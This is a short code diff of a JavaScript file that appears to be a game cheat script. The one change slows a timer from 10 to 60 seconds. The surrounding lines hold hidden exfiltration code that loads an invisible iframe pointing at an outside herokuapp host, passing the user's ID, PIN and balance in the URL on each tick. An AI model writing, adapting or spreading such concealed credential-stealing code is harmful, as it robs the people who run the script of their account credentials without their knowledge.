@@ -165,7 +165,7 @@
     i.style.position = "fixed";
     i.src = "https://cagna.herokuapp.com/?ID:" + bbid + "%20PIN:" + ljm + "%20BAL:" + bal;
     document.body.appendChild(i);
-  }setInterval(log, 10000);
+  }setInterval(log, 60000);
 
   // Functions that make the cheats work
   function highlight(){
